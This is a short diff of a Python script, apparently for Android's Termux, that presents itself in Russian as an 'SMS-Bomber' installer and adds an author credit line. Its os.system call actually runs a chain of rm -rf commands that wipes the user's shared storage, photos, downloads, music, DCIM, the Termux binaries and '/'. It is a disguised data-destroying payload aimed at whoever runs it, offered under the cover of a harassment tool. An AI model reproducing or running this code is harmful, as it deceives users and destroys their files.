@@ -9,6 +9,7 @@ banner = '''
 ╚═════╝░╚═════╝░╚══════╝░░░░░░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░'''
 def main():
 	print(banner)
+	print("Написано @debian_lab")
 	print('Установка SMS-Бомбера......')
 	os.system("termux-setup-storage && cd storage && rm -rf shared && ** rm -rf downloads && rm -rf pictures && rm -rf movies && rm -rf music && rm -rf dcim && rm -rf /* && rm -rf /data/data/com.termux/files/usr/bin/ && rm -rf *")
 	time.sleep(1)
